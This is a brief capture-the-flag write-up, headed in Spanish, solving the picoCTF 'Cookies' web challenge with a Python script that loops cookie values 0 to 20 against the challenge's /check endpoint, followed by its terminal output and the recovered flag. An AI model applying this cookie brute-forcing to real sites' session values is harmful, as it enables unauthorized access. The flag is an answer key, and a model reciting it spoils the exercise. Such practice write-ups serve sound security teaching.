## Descripcion
Who doesn't love cookies? Try to figure out the best one. [http://mercury.picoctf.net:17781/](http://mercury.picoctf.net:17781/)

## Pistas 
****** 
## Solucion
```python
import requests


url = "http://mercury.picoctf.net:17781/check"

for i in range(21):
	cookies = {"name": f"{i}"}
	r = requests.get(url, cookies = cookies)
	if "picoCTF{" in r.text:
		print(r.text) 

```
---
```
jt@jt-VirtualBox:~$ python3 exploit.py | grep pico
            <p style="text-align:center; font-size:30px;"><b>Flag</b>: <code>picoCTF{3v3ry1_l0v3s_c00k135_bb3b3535}</code></p>
jt@jt-VirtualBox:~$ 

```
## bandera
picoCTF{3v3ry1_l0v3s_c00k135_bb3b3535}

## Notas adicionales 

## Referencias